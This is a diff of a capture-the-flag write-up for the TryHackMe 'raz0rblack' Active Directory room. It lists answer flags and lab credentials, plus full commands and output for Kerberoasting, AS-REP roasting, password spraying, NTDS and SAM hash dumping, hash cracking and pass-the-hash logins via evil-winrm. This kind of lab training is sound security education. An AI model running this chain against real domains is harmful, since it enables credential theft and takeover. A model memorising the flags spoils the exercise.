@@ -3,26 +3,28 @@
 What is the Domain Name? 
 - raz0rblack.thm
 What is Steven's Flag?
--
+- THM{ab53e05c9a98def00314a14ccbfa8104}
 What is the zip file's password?
-- 
+- electromagnetismo
 What is Ljudmila's Hash?
--
+- `f220d3988deb3f516c73f40ee16c431d`
 What is Ljudmila's Flag?
--
+- `THM{694362e877adef0d85a92e6d17551fe4}`
 What is Xyan1d3's password?
-- `xyan1d3`:`cyanide9amine5628`
+- `cyanide9amine5628`
 What is Xyan1d3's Flag?
--
+- `THM{62ca7e0b901aa8f0b233cade0839b5bb}` 
 What is the root Flag?
--
+- `THM{1b4f46cc4fba46348273d18dc91da20d}`
 What is Tyson's Flag?
--
+- `THM{5144f2c4107b7cab04916724e3749fb0}`
 What is the complete top secret?
--
-Did you like your cookie?
--
+- 
 
+## creds:
+- `xyan1d3`:`cyanide9amine5628`
+- `twilliams`:`roastpotatoes`
+- `lvetrova`: hash`f220d3988deb3f516c73f40ee16c431d`
 
 ### steps: 
 ```bash
@@ -121,11 +123,9 @@ Downloads/kerbrute_linux_amd64 userenum -d raz0rblack.thm --dc 10.10.176.146 att
 ``` 
 
 - search for user to get tgt
+
 ```bash
-python3.9 /opt/impacket/examples/GetNPUsers.py THM-AD/svc-admin -no-pass -dc-ip 10.10.35.127
-```
-```bash
-/usr/bin/impacket-GetNPUsers raz0rblack.thm/twilliams -no-pass -dc-ip 10.10.124.230
+impacket-GetNPUsers raz0rblack.thm/twilliams -no-pass -dc-ip 10.10.124.230
 ```
 - TGT for twilliams:
 ```
@@ -148,21 +148,10 @@ Password for [WORKGROUP\twilliams]:
         SYSVOL          Disk      Logon server share 
         trash           Disk      Files Pending for deletion
 ```
-smbclient \\\\10.10.124.230\\NETLOGON -U twilliams 
-- try to get tgs
 ```bash
-/usr/bin/impacket-GetUserSPNs  raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.222.240 -request
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
-HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               
-
-
-
-[-] CCache file is not found. Skipping...
-[-] Principal: raz0rblack.thm\xyan1d3 - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+smbclient \\\\10.10.124.230\\NETLOGON -U twilliams 
 ```
+- try to get tgs
 - using attack box in thm
 ```bash
 root@ip-10-10-110-164:~# /usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/EGG-INFO/scripts/GetUserSPNs.py raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.38.244 -request
@@ -179,6 +168,36 @@ $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$fac5c010a5312dddb921
 ```
 - `xyan1d3`:`cyanide9amine5628`
 
+```bash
+evil-winrm -i 10.10.190.134 -u xyan1d3 -p cyanide9amine5628
+```
+
+```
+*Evil-WinRM* PS C:\Users\xyan1d3\Desktop> type ..\xyan1d3.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Nope your flag is not here</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+```
+```
+*Evil-WinRM* PS C:\Users\xyan1d3> $cred = Import-Clixml -Path xyan1d3.xml
+*Evil-WinRM* PS C:\Users\xyan1d3> Write-Host "Username: $($cred.Username)"
+Username: Nope your flag is not here
+*Evil-WinRM* PS C:\Users\xyan1d3> Write-Host "Password: $($cred.GetNetworkCredential().Password)"
+Password: LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
+```
+#### xyan1d3 flag: `THM{62ca7e0b901aa8f0b233cade0839b5bb}`
+
 ### nfs
 
 ```bash
@@ -192,7 +211,6 @@ nmap 10.10.176.146 --script="*nfs*"
 |   access: Read Lookup NoModify NoExtend NoDelete NoExecute
 | PERMISSION  UID         GID         SIZE  TIME                 FILENAME
 | rwx------   4294967294  4294967294  64    2021-02-27T17:24:37  .
-| ??????????  ?           ?           ?     ?                    ..
 | rwx------   4294967294  4294967294  9861  2021-02-25T16:24:06  employee_status.xlsx
 | rwx------   4294967294  4294967294  80    2021-02-25T19:31:46  sbradley.txt
 ```
@@ -204,10 +222,8 @@ sudo service rpcbind start
 sudo mount -t nfs $ip:/users /tmp/razor
 ```
 ```bash
-Third question
-└─$ sudo cat  razor/sbradley.txt         
-��THM{ab53e05c9a98def00314a14ccbfa8104}
-
+sudo cat  razor/sbradley.txt         
+THM{ab53e05c9a98def00314a14ccbfa8104}
 ```
 the other file: 
 ```
@@ -223,4 +239,217 @@ rico delgado
 tyson williams		
 steven bradley		
 chamber lin		
+```
+
+- get data for zip file
+```
+zip2john expermint_.zip > zip_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt 
+electromagnetismo (experiment_gone_wrong.zip)
+```
+
+- extract hashes form ntds.dit and system.hive
+```bash
+impacket-secretsdump -system system.hive  -ntds ntds.dit LOCAL > hashes.txt
+```
+```
+RAZ0RBLACK\t.tyson:5482:aad3b435b51404eeaad3b435b51404ee:8ab7ef3e13f1d98026886eba721d4c0f:::
+RAZ0RBLACK\v.travis:5389:aad3b435b51404eeaad3b435b51404ee:6c90a8bbe8d3f62d1b118414673f4727:::
+RAZ0RBLACK\v.toney:6018:aad3b435b51404eeaad3b435b51404ee:41e173da45fc0024ac0b2f018a982e8e:::
+
+```
+```bash
+hashcat -m 1000 admin_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```bash
+evil-winrm -i 10.10.47.201  -u administrator -p PassW0rd
+```
+- to gain access to administrator -> didn't work
+
+
+
+```bash
+crackmapexec smb 10.10.240.104  -u lvetrova -d raz0rblack.thm -H ntlms.txt 
+```
+```
+
+SMB         10.10.240.104   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:081af9630677a387f6f0a9bb17852602 STATUS_LOGON_FAILURE 
+SMB         10.10.240.104   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:c184a72ed800899bc1ff633778a89b5e STATUS_LOGON_FAILURE 
+SMB         10.10.240.104   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d 
+
+```
+
+- lvetrova hash is `f220d3988deb3f516c73f40ee16c431d`
+
+```bash
+evil-winrm -i 10.10.135.84 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
+```
+
+```
+*Evil-WinRM* PS C:\Users\lvetrova> $cred = Import-Clixml -Path lvetrova.xml
+*Evil-WinRM* PS C:\Users\lvetrova> Write-Host "Username: $($cred.Username)"
+Username: Your Flag is here =>
+*Evil-WinRM* PS C:\Users\lvetrova> Write-Host "Password: $($cred.GetNetworkCredential().Password)"
+Password: THM{694362e877adef0d85a92e6d17551fe4}
+
+```
+
+---------
+[-=-] enumeration users
+```bash
+impacket-lookupsid 'twilliams:roastpotatoes'@10.10.135.84 
+```
+```bash 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at 10.10.135.84
+[*] StringBinding ncacn_np:10.10.135.84[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-3403444377-2687699443-13012745
+498: RAZ0RBLACK\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: RAZ0RBLACK\Administrator (SidTypeUser)
+501: RAZ0RBLACK\Guest (SidTypeUser)
+502: RAZ0RBLACK\krbtgt (SidTypeUser)
+512: RAZ0RBLACK\Domain Admins (SidTypeGroup)
+513: RAZ0RBLACK\Domain Users (SidTypeGroup)
+514: RAZ0RBLACK\Domain Guests (SidTypeGroup)
+515: RAZ0RBLACK\Domain Computers (SidTypeGroup)
+516: RAZ0RBLACK\Domain Controllers (SidTypeGroup)
+517: RAZ0RBLACK\Cert Publishers (SidTypeAlias)
+518: RAZ0RBLACK\Schema Admins (SidTypeGroup)
+519: RAZ0RBLACK\Enterprise Admins (SidTypeGroup)
+520: RAZ0RBLACK\Group Policy Creator Owners (SidTypeGroup)
+521: RAZ0RBLACK\Read-only Domain Controllers (SidTypeGroup)
+522: RAZ0RBLACK\Cloneable Domain Controllers (SidTypeGroup)
+525: RAZ0RBLACK\Protected Users (SidTypeGroup)
+526: RAZ0RBLACK\Key Admins (SidTypeGroup)
+527: RAZ0RBLACK\Enterprise Key Admins (SidTypeGroup)
+553: RAZ0RBLACK\RAS and IAS Servers (SidTypeAlias)
+571: RAZ0RBLACK\Allowed RODC Password Replication Group (SidTypeAlias)
+572: RAZ0RBLACK\Denied RODC Password Replication Group (SidTypeAlias)
+1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)
+1101: RAZ0RBLACK\DnsAdmins (SidTypeAlias)
+1102: RAZ0RBLACK\DnsUpdateProxy (SidTypeGroup)
+1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)
+1107: RAZ0RBLACK\lvetrova (SidTypeUser)
+1108: RAZ0RBLACK\sbradley (SidTypeUser)
+1109: RAZ0RBLACK\twilliams (SidTypeUser)
+```
+- Password Spraying
+```bash
+crackmapexec smb 10.10.135.84  -u usernames.txt -p roastpotatoes --continue-on-success
+```
+```bash
+SMB         10.10.135.84    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\daven port:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.135.84    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.135.84    445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE
+```
+
+- we can set sbradley password
+
+```bash
+smbpasswd -r $ip -U sbradley
+```
+
+
+
+
+```bash
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /all
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+```
+
+- get ths sam from the victim AD 
+```bash
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> REG SAVE HKLM\sam C:\Users\xyan1d3\Documents\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> REG SAVE HKLM\system C:\Users\xyan1d3\Documents\system
+The operation completed successfully.
+```
+- get the stored hash
+```bash
+impacket-secretsdump -sam sam -system system local
+```
+```bash
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up... 
+```
+- now i can get access using administrator account
+```bash
+evil-winrm -i 10.10.3.117 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
+```
+
+```bash 
+type root.xml
+```
+```bash
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Administrator</S>
+      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
+  </Obj>
+</Objs>
+```
+
+- python script to convert form hex to string
+```python 
+cat fromHex.py                                                                        
+hex_str = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
+print(bytes.fromhex(hex_str).decode('utf-8'))
+```
+
+
+```bash
+python fromHex.py       
+Damn you are a genius.
+But, I apologize for cheating you like this.
+
+Here is your Root Flag
+THM{1b4f46cc4fba46348273d18dc91da20d}
+
+Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.
+
+If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
+Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
+
+```
+
+- we go to twilliams dir
+
+```bash
+*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+THM{5144f2c4107b7cab04916724e3749fb0}
+```
+- search windows for a file called secret
+```bash
+Get-ChildItem -Path C:\ -Recurse -Name "*secret*" -ErrorAction SilentlyContinue
+Program Files\Top Secret\top_secret.png
 ```
